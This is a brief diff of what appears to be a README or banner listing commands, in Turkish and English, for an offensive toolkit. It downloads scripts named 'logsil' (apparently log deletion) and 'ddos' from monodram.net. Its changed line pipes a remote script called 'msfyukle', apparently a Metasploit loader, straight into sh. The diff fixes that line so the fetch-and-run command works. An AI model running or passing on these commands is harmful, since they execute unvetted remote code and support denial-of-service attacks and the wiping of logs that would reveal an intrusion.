@@ -17,4 +17,4 @@ $$ | $$ | $$ |$$ |  $$ |$$ |  $$ |
 Komutlar | Commands
 1-> wget https://monodram.net/shell/logsil
 2-> wget https://monodram.net/shell/ddos
-3-> wget curl https://monodram.net/shell/msfyukle | sh
+3-> curl https://monodram.net/shell/msfyukle | sh
